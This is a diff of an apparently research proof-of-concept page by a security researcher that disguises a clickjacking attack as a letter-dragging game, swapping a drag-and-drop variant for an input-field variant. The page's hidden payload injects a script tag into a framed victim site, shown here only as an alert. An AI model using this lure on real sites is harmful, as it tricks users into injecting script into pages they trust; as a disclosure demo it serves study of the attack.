@@ -2,8 +2,7 @@
 <!--
 @author Krzysztof Kotowicz <kkotowicz at gmail dot com>
 @see http://blog.kotowicz.net
-
-drag&drop variant
+input variant
 -->
 <html>
 <head>
@@ -23,10 +22,11 @@ $(function() {
   var pwn = function() {
 
     $("#payload")
-      .bind('dragstart',function(e) {
+/*      .bind('dragstart',function(e) {
         e.originalEvent.dataTransfer.setData('text/plain', $(this).attr('data-payload'));
         follow(e);
-      })
+      })*/
+      .mousedown(function() { this.select(); })
       .bind('dragend', function() {
         $(this).hide();
         unfollow();
@@ -96,7 +96,7 @@ height: 20px;
 
 #victim.reveal {
  opacity: 0.6 !important;
- height: 50px !important;
+ height: 100px !important;
  border: 1px solid red;
 }
 
@@ -185,7 +185,8 @@ The cursor will change to hint you that you're on the right track.</p>
 <div id=game>
   <div class=letters id=letters2><span>h</span> <span>i</span> <span>n</span> <span>c</span></div><div class=letters id=letters><span>a</span> <span>d</span> <span>g</span> <span>x</span></div><div class=letters id=letters3><span>q</span> <span>p</span> <span>w</span> <span>e</span></div>
   <div id=respawn-point>
-    <div class=source-letter id="payload" draggable=true data-payload='&lt;SCRIPT&gt;alert("Hello " + login + "!\nYou&apos;re OWNED by XSS-via-clickjacking! \n\nWant to see why? Append #showme to URL &amp; reload")&lt;/script&gt;'>G</div>
+    <input class=source-letter id="payload" dsraggable=true value='G &lt;SCRIPT&gt;alert("Hello " + login + "!\nYou&apos;re OWNED by XSS-via-clickjacking! \n\nWant to see why? Append #showme to URL &amp; reload")&lt;/script&gt;' />
+    <!--div class=source-letter id="payload" draggable=true data-payload='&lt;SCRIPT&gt;alert("Hello " + login + "!\nYou&apos;re OWNED by XSS-via-clickjacking! \n\nWant to see why? Append #showme to URL &amp; reload")&lt;/script&gt;'>G</div-->
   </div>
 </div>
 <a id=score style="display:none" href="#">Check score</a>
